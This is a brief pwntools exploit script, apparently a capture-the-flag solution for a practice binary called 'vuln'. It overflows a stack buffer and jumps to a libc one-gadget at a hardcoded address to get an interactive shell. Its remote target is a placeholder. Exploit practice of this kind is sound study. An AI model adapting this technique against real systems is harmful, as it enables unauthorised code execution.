#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = exe
context.arch = 'amd64'
context.terminal = ["urxvt", "-e", "sh", "-c"]


def conn():
	if args.LOCAL:
		r = process([exe.path])
		if args.DEBUG:
			gdb.attach(r)
	else:
		r = remote("addr", 1337)

	return r


def main():
	r = conn()
	#gdb.attach(r)

	# good luck pwning :)



	libc.addr = 0x007ffff7dd5000

	one_gadg = libc.addr + 0xc8260

	payload = b"\0"*0x48
	payload += p64(one_gadg)

	r.sendline(payload)

	r.interactive()


if __name__ == "__main__":
	main()
